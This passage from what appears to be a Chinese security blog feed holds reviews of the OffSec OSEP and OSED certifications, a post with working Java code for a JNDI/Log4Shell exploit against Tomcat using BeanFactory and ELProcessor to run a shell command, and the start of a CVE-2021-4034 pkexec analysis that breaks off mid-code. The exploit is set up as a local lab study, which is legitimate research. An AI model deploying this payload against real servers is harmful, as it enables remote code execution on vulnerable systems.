KLCP课程 + 1次KLCP考试机会 + PG Practice会员</p><p>Learn Unlimited套餐（5499美元）: OffSec所有课程 + 365天Lab + 无限次考试机会（受冷静期约束） + PG Practice会员</p><h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><p>可以发现300系列的套餐没有30天套餐，建议学习时间比较充沛的可以选择60天Lab，如果平时事情比较忙，可以考虑90天的Lab，由于我空闲时间比较充足，我的OSEP和OSED都是选择的60天套餐以节约时间，由于我的主要学习方向是Web安全，因此OSWE则是选择了更便宜的30天套餐（此套餐已经退役，并且大概率不会再出）</p><blockquote><p>如何报名参加OffSec的认证与课程请阅读PEN200-OSCP篇</p></blockquote><h2 id="300系列横向比较"><a href="#300系列横向比较" class="headerlink" title="300系列横向比较"></a>300系列横向比较</h2><p>虽然在OffSec官方的评级下，300系列的三门课程难度是一致的，但是由于三个课程的考察方向不同，因此对于不同基础的每个人来说每个证书的难度也不同，我在和其它考生交流和讨论后，尽量避免由于基础产生的差异，认为PEN300-OSEP是一般而言最简单的一个，因为相比另外两门课程重点考察exploit的开发，OSEP还是聚焦在enumeration，对开发能力的需求更少</p><h2 id="如何预习"><a href="#如何预习" class="headerlink" title="如何预习"></a>如何预习</h2><p>300系列的课程被OffSec认定为高级课程，全部都需要或多或少的开发能力，官方页面上也给出了基础能力的需求，如下</p><ul><li>扎实的enumeration和exploit能力（也就是PEN200-OSCP所重点考察的）</li><li>识别和利用漏洞的能力，如SQL注入、文件包含和本地提权</li><li>对于Active Directory（后简称AD，也就是中文中常说的“域”）和AD相关的攻击有基础的了解</li></ul><p>除了官方自己给出的Prerequisites(预备知识)，我经过课程的学习后，我认为掌握一些额外的基础知识会对于课程学习或参与考试有较大的帮助</p><ul><li>熟练使用PowerShell，能够使用PowerShell对.Net Framework进行调用</li><li>熟练使用C#并掌握各种语言高级特性，尤其是反射等</li><li>对Windows API有足够的了解，明白如何使用C#调用Windows API</li><li>对Microsoft Windows系列的产品如Microsoft SQL Server、ASP.NET较为熟悉</li></ul><p>官网教材大纲：<a href="https://www.offensive-security.com/documentation/PEN300-Syllabus.pdf">PEN-300-Syllabus (offensive-security.com)</a></p><p>如果时间充沛，可以对着大纲，把各个知识点进行预习，也是不错的选择</p><p>由于由多台靶机构成的这样的内网练习环境目前还比较少见，我就不推荐课外的靶场了，我个人也没有为了OSEP去刷其它的靶场，如果有需要，可以自己选择</p><p>虽然我提到了OSEP在300系列的认证中开发能力要求最低，但是为什么还是建议大家掌握PowerShell和C#这些东西呢？这是因为教材中会为各种用到的技术进行深入讲解，包括每一行是做什么的，如何自己修改。虽然可以直接保存模板代码然后应对考试直接套用，但是我认为，学完教材中的原理，才是最重要的，否则就还是一个高级的一点的脚本小子罢了</p><h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>课程中的几个重要资源如下</p><ul><li>教材 PDF版本和视频版本，建议阅读PDF，效率更高，看不懂的地方看视频操作即可</li><li>Lab 提供了最贴近考试的各种靶机环境</li><li>300系列的学生靶机为每个学生独享，与OSCP的所有学生共享不同</li><li>学生论坛 里面提供了各种Lab机器的提示以及讨论，并且在官方管理员的控制下不会有答案泄漏</li><li>官方Discord频道 相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在<a href="https://portal.offensive-security.com/">https://portal.offensive-security.com/</a> 中可以获取到邀请链接</li></ul><p>OSEP的Lab环境与OSCP有显著的不同，OSCP Lab中每台机子都是一台独立的靶机，但是由于OSEP重点在于横向移动和域渗透，所以以Challenge的形式进行练习，每个Challenge中都会有多个靶机，少则3台，多至10台左右，每台靶机都会有不同的解法来拿下，如钓鱼、横向移动、SQL漏洞等</p><p>考试重点考察4块领域的能力，也是我们要重点学习的地方</p><ul><li>横向移动（包括在多个网段之间穿越）</li><li>域渗透（主要是AD以及相关产品如MSSQL）</li><li>免杀(以静态免杀为主)</li><li>客户端攻击（也就是俗称的钓鱼）</li></ul><p>相比PEN200-OSCP，PEN300-OSEP更加贴近实战，为什么这么说呢，在Lab和考试中，你都会发现，大部分机器的杀毒软件如Windows Defender都处在运行状态，只不过没有联网，在你拿到了管理员权限后，你还需要想办法去把这些安全软件给关闭或绕过，否则它们不仅会在获取shell的阶段妨碍你，还会在你进行横向移动或进行post-enumeration时妨碍你</p><h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><blockquote><p>官方的考试指引：<a href="https://help.offensive-security.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide">OSEP Exam Guide – Offensive Security Support Portal (offensive-security.com)</a></p><p>300系列的考试时长均为48小时</p></blockquote><p>很多同学都是因为OSCP证书才了解到OffSec的认证体系，OSCP证书的考试形式相比其它证书采取实操制已经相当独特，而OSEP则采取了更加有趣的考试形式</p><p>在OSEP考试中，由于还是考查渗透测试技术，还是需要去攻击各台靶机，但是这次提供给我们的是一个模拟的实战环境，OffSec模拟出一个虚构的目标，也许是一个大型公司、也许是一个银行。考试提供给考生几个IP作为暴露的安全边界，你可以通过多种方式进行突破，可以攻击Web服务、可以尝试直接打exploit、甚至可以利用钓鱼</p><p>突破内网之后，就要开始横向移动了，综合利用各种技术，增加自己控制靶机的数量，每拿下一个靶机的最高权限账户，可以拿到proof.txt，对于部分靶机的低级用户还有local.txt，每个拿到的flag都价值10分，有两种方式通过考试，拿到10个flag也就是100分通过考试，或者攻克模拟的最终目标，其flag保存在secret.txt，拿到secret.txt就能够直接通过考试了</p><p>根据官方的说法，有至少两条攻击路径可以到达secret.txt，这意味着要么走完其中一条，或者两条路径都差不多走到一半，还是比较有弹性的，大家考试时可以自由选择</p><p>我在考试时由于另一条路线的安全软件一直绕不过去，所以就是一条路线走到底了，拿到了secret.txt成功通过考试，其中也经过了不止一个网段，感觉OSEP考试还是非常有趣</p><p>OSEP考试所用到的技术在Lab的Challenge全部有考查到，因此我认为只要扎实练好官方Challenge，掌握每一个知识点，通过考试还是不成问题的</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p><a href="mailto:&#x34;&#120;&#112;&#x6c;&#x30;&#x72;&#51;&#x72;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#x34;&#120;&#112;&#x6c;&#x30;&#x72;&#51;&#x72;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a></p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSEP-PEN300.assets/image-20220127223737014.png" alt="image-20220127223737014"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在2022年1月我拿到了OSCE3，OSEP是我在21年8月拿到的，其和PEN200-OSCP均属于PEN系列，也就是渗透测试类。&lt;/p&gt;</summary>
    
    
    
    <category term="证书" scheme="https://cn.4xpl0r3r.com/categories/%E8%AF%81%E4%B9%A6/"/>
    
    
    <category term="OffSec" scheme="https://cn.4xpl0r3r.com/tags/OffSec/"/>
    
  </entry>
  
  <entry>
    <title>OSCE3之路 - OSED | EXP301</title>
    <link href="https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSED-EXP301/"/>
    <id>https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSED-EXP301/</id>
    <published>2022-02-15T07:13:25.000Z</published>
    <updated>2023-07-21T02:55:24.222Z</updated>
    
    <content type="html"><![CDATA[<p>OSED是我在在2022年1月拿到的，同时也是我OSCE3所需的最后一个证书，其名称为301，而不是300，这是因为EXP301-OSED专注于Windows环境下的二进制安全开发与利用。</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的版本：<a href="https://4xpl0r3r.com/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">English</a>.</div></article><article class="message message-immersive is-warning"><div class="message-body"><i class="fas fa-exclamation-triangle mr-2"></i>本文部分信息已过时，请以官方信息为准。</div></article><blockquote><p>对于一些更加基础的信息，如报名问题、网络问题，请参阅OSCP篇</p><p>OffSec的所有认证都没有前置要求，如果不想考OSCP直接考OSED，完全是可以的</p></blockquote><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote><p>有关EXP301-OSED证书的官方最新信息位于这里：<a href="https://www.offensive-security.com/exp301-osed/">https://www.offensive-security.com/exp301-osed/</a></p></blockquote><h3 id="报名方式和费用"><a href="#报名方式和费用" class="headerlink" title="报名方式和费用"></a>报名方式和费用</h3><p>对于个人用户，目前Offensive Security(后称OffSec)提供了2种购买方式</p><ul><li><p>Packages</p></li><li><p>Subscriptions - 订阅制</p></li></ul><p>####Packages</p><ul><li>课程 + 60天Lab + 1次OSED考试 1299美元</li><li>课程 + 90天Lab + 1次OSED考试 1499美元</li><li>重考费：249美元</li><li>30天Lab延长：359美元</li><li>60天Lab延长：599美元</li><li>90天Lab延长：799美元</li></ul><h4 id="Subscriptions"><a href="#Subscriptions" class="headerlink" title="Subscriptions"></a>Subscriptions</h4><p>Learn One套餐（2499美元）: EXP301-OSEP课程 + 2次OSED考试机会 + PEN210-OSWP课程 + 1次OSWP考试机会 + 365天Lab + PEN100课程 + KLCP课程 + 1次KLCP考试机会 + PG Practice会员</p><p>Learn Unlimited套餐（5499美元）: OffSec所有课程 + 365天Lab + 无限次考试机会（受冷静期约束） + PG Practice会员</p><h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><p>可以发现300系列的套餐没有30天套餐，建议学习时间比较充沛的可以选择60天Lab，如果平时事情比较忙，可以考虑90天的Lab，由于我空闲时间比较充足，我的OSEP和OSED都是选择的60天套餐以节约时间，由于我的主要学习方向是Web安全，因此OSWE则是选择了更便宜的30天套餐（此套餐已经退役，并且大概率不会再出）</p><blockquote><p>如何报名参加OffSec的认证与课程请阅读PEN200-OSCP篇</p></blockquote><h2 id="300系列横向比较"><a href="#300系列横向比较" class="headerlink" title="300系列横向比较"></a>300系列横向比较</h2><p>OSED是300系列中最新的认证，相较于PEN系列注重于黑盒，OSWE注重Web白盒，OSED专注在二进制安全，也就是常说的PWN和逆向，很多人认为OSED的考试是最难的，但是我认为OSWE在思维难度考查上才是最难的，而OSED大家认为比较难可能是因为目前以二进制为主攻方向的同学占比比较少，虽然我主攻方向也是Web方向，OSWE也是我最轻松拿下的证书。OSED的难点在于对计算机底层需要有比较好的基础才能比较顺利地学习，否则很多地方可能都会一知半解</p><h2 id="如何预习"><a href="#如何预习" class="headerlink" title="如何预习"></a>如何预习</h2><p>根据官方的PREREQUISITES，需要如下能力</p><ul><li>熟悉调试器（官方写的是ImmunityDBG, OllyDBG，其实课程和考试都不用……一定要熟练使用WinDbg）</li><li>熟悉32位的基本exploit理论</li><li>熟悉Python3脚本的编写</li><li>基本能够阅读C语言代码</li><li>能够理解32位汇编代码</li></ul><p>EXP301-OSED只考察Windows的32位环境也就是x86架构下的Exploit，这也是其被批评的一个点，因为现在大部分都是x64架构的计算机了，但是其实x86_64也就是x86架构的升级版，我认为通过学习x86来掌握基本的二进制研究能力也是一个比较好的选择，直接从x64入手的话学习曲线会过于崎岖</p><p>对于汇编语言的基础学习，我的建议使用最知名的《汇编语言》(王爽著)，这本书非常厚，但不需要完全学完</p><p>除此之外，最好对《操作系统》这门基础课程比较熟悉，否则很多概念就一知半解了</p><p>为了熟悉32位的基本二进制exploit，可以选择CTF的PWN方向作为入门选择，也可以选择<a href="https://ropemporium.com/">ROP Emporium</a>这个网站提供的练习题进行练习，由于这个网站只提供了题目文件，没有虚拟练习环境，可以自己使用虚拟机搭建虚拟练习环境，这里我推荐我自己制作的一个小工具来搭建练习环境，其使用文档在我的博客上：<a href="https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/">DIPD-文档 - 4xpl0r3r’s blog</a>，关于使用问题也可以在文章下面留言</p><p>ROP Emporium每道题支持4种练习架构，<code>x86</code>、<code>x86_64</code>、<code>ARMv5</code>、<code>MIPS</code>，如果只是准备EXP301-OSED的话只需要练习<code>x86</code>架构即可，如果想要感受下<code>x86</code>和现代的<code>x86_64</code>的差别，也可以练习<code>x86_64</code>，如果后续想要进军IoT二进制安全，可以研究下ARM和MIPS，但是就需要自己搭建QEMU异构虚拟机来实验了</p><h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>课程中的几个重要资源如下</p><ul><li>教材 PDF版本和视频版本，建议阅读PDF，效率更高，看不懂的地方看视频操作即可</li><li>Lab 提供了最贴近考试的各种靶机环境，由于EXP301的教材以实例讲解，Lab中也提供了教材的配套靶机，除此之外还有几个供学生练习的Challenge，Challenge的详情在教材中会介绍，都和教材教的内容类似</li><li>300系列的学生靶机为每个学生独享，与OSCP的所有学生共享不同</li><li>学生论坛 里面提供了各种Lab机器的提示以及讨论，并且在官方管理员的控制下不会有答案泄漏</li><li>官方Discord频道 相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在<a href="https://portal.offensive-security.com/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E9%82%80%E8%AF%B7%E9%93%BE%E6%8E%A5">https://portal.offensive-security.com/中可以获取到邀请链接</a></li></ul><p>EXP301-OSED课程的学习方式和WEB300-OSWE比较相似，我的学习方法就是边看PDF边练习，把教材里的实例都练习完之后，基本就掌握得差不多了，期间通过反复实践，总结思考出自己的方法论</p><p>对于WEB300-OSWE和EXP301-OSED，我都强烈建议边学习边总结思维导图，这对于巩固学习以及在考试中思考攻击路径都极有帮助</p><p>我在学习中总结出EXP301-OSED的核心内容就是：以栈溢出为核心，研究DEP和ASLR的绕过，同时学习ShellCode的开发和逆向工程。在考试中也是这些内容为核心，因此在学习之前可以有一个大概的脉络</p><p>还有一些小细节需要注意，OSED考试允许使用IDA但是不能使用IDA Pro，只能使用IDA免费版，这意味着只能使用IDA来进行反汇编而不能使用IDA的F5大法，要注意。调试也只能使用WinDbg进行调试</p><h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><blockquote><p>官方的考试指引：<a href="https://help.offensive-security.com/hc/en-us/articles/360052977212-OSED-Exam-Guide">OSED Exam Guide – Offensive Security Support Portal (offensive-security.com)</a></p><p>300系列的考试时长均为48小时</p></blockquote><p>相比于教材和Lab基本都是使用真实案例做例子，考试则全部使用OffSec自行开发的题目</p><p>考试由三个独立的Assignment(任务)组成，分数分别为40分、30分、30分，通过考试的分数为60分，因此完成其中的2个任务即可通过考试</p><p>考试的3个任务会考察到大纲中的所有话题，包含了逆向工程、开发exploit绕过mitigation(也就是DEP和ASLR)以及开发自制的shellcode（使用汇编语言开发）</p><p>考试的思维难度不大，但是我认为如果对汇编语言不熟悉的同学，做起来会很吃力，因为需要阅读的代码量还是不小的，大部分题目都比较直接，比较需要创造力的部分我认为就是构建ROP链以及利用逆向工程找到可以利用的漏洞这两部分。</p><p>我个人感觉每个任务基本上没有部分得分这样的选项，完全完成任务就得到这个任务的所有分数，否则就一分都没有</p><p>有些题目会提供一个模板Exp，需要进一步去完善，有些题目则没有Exp，需要通过逆向工程来寻找漏洞</p><p>有几个坑点一定要注意</p><ul><li>逆向工程工具必须使用IDA Freeware，不能使用IDA Pro或者Ghidra</li><li>最终的Exploit必须使用Python3编写，不能使用其它语言也不能使用Python2</li><li>不像其它的OffSec认证最终只需要上传报告不需要上传代码，OSED需要上传每一个任务的最终代码</li></ul><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如果你想要了解的信息文章中没有提到，欢迎发邮件给我一起交流，也欢迎加个好友，通过邮件发送联系方式给我即可</p><p><a href="mailto:&#52;&#120;&#x70;&#108;&#48;&#x72;&#x33;&#x72;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#52;&#120;&#x70;&#108;&#48;&#x72;&#x33;&#x72;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a></p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSED-EXP301.assets/image-20220127223819917-4591435.png" alt="image-20220127223819917-4591435"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;OSED是我在在2022年1月拿到的，同时也是我OSCE3所需的最后一个证书，其名称为301，而不是300，这是因为EXP301-OSED专注于Windows环境下的二进制安全开发与利用。&lt;/p&gt;</summary>
    
    
    
    <category term="证书" scheme="https://cn.4xpl0r3r.com/categories/%E8%AF%81%E4%B9%A6/"/>
    
    
    <category term="OffSec" scheme="https://cn.4xpl0r3r.com/tags/OffSec/"/>
    
  </entry>
  
  <entry>
    <title>在Tomcat环境下使用JNDI绕过trusted codebase限制的Exploit</title>
    <link href="https://cn.4xpl0r3r.com/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/"/>
    <id>https://cn.4xpl0r3r.com/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/</id>
    <published>2022-02-13T12:48:52.000Z</published>
    <updated>2022-02-13T12:52:18.735Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90">CVE-2021-44228 log4j2 RCE 分析</a>中，我们实现了在Java 8u181中通过JNDI加载恶意类实现RCE，本文我们实现一个在trusted codebase限制下实现RCE的Exploit</p><span id="more"></span><h2 id="搭建Tomcat脆弱环境"><a href="#搭建Tomcat脆弱环境" class="headerlink" title="搭建Tomcat脆弱环境"></a>搭建Tomcat脆弱环境</h2><p>IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9，Java版本使用Java 8u292，在<code>pom.xml</code>中引入log4j-core 2.14.1的依赖</p><p>在自动创建的<code>HelloServlet</code>类中的<code>doGet</code>写入触发log4j漏洞的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Tomcat9Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1199/Exploit&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="制作Exploit"><a href="#制作Exploit" class="headerlink" title="制作Exploit"></a>制作Exploit</h2><blockquote><p>参考：<a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">如何绕过高版本JDK限制进行JNDI注入利用 (qq.com)</a></p><p>原理部分可以阅读参考的KINGX师傅的文章</p></blockquote><p>将Tomcat的<code>lib</code>文件夹和<code>bin/tomcat-juli.jar</code>引入项目的libraries来消除依赖问题</p><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1199</span>);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;payload=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;curl 127.0.0.1:4444&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行Exploit和Tomcat项目并访问<code>doGet</code>方法触发log4j漏洞，就能成功执行命令</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90&quot;&gt;CVE-2021-44228 log4j2 RCE 分析&lt;/a&gt;中，我们实现了在Java 8u181中通过JNDI加载恶意类实现RCE，本文我们实现一个在trusted codebase限制下实现RCE的Exploit&lt;/p&gt;</summary>
    
    
    
    <category term="Exploit" scheme="https://cn.4xpl0r3r.com/categories/Exploit/"/>
    
    
    <category term="Tomcat" scheme="https://cn.4xpl0r3r.com/tags/Tomcat/"/>
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-4034 Linux Polkit 权限提升漏洞分析</title>
    <link href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-02-11T11:39:15.000Z</published>
    <updated>2022-09-14T02:11:57.882Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要参考官方的<a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Advisory</a>来进行分析</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/">English</a>.</div></article><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2022-01-25，CVE-2021-4034 Exploit 详情发布，此漏洞是由<a href="https://www.qualys.com/">Qualys</a>研究团队在polkit的pkexec中发现的一个内存损坏漏洞</p><p>pkexec 应用程序是一个 setuid 工具，允许非特权用户根据预定义的策略以特权用户身份运行命令，基本上所有的主流Linux系统都安装了此工具，其自身也被设置了SUID权限位以正常运转</p><p>影响了自2009年5月第一个版本以来的所有pkexec版本，Commit 地址：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/c8c3d835d24fc4ce5a9c596c7d55d85a0311e8d1">Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab</a></p><p>由于pkexec的广泛应用，此漏洞基本通杀目前所有Linux发行版，有效范围很大</p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>选择一个修复前的版本进行分析，<a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c">src/programs/pkexec.c · 0.120 · polkit / polkit · GitLab</a></p><p>根据披露，漏洞存在于pkexec的主函数，相对路径为<code>/src/programs/pkexec.c</code></p><p>在534-568行，处理命令行参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++) <span class="comment">// 